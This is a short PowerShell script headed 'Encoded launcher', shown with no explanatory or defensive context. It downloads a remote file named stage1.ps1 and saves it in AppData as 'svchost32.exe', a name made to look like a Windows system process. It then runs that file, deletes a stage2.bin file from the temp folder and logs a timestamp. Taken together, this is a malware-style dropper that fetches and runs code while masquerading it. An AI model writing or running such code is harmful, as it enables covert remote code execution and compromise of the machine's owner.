
# Encoded launcher
Start-BitsTransfer -Source "https://internal.corp:443/stage1.ps1" -Destination "$env:APPDATA\svchost32.exe"
Start-Process -FilePath "$env:APPDATA\svchost32.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
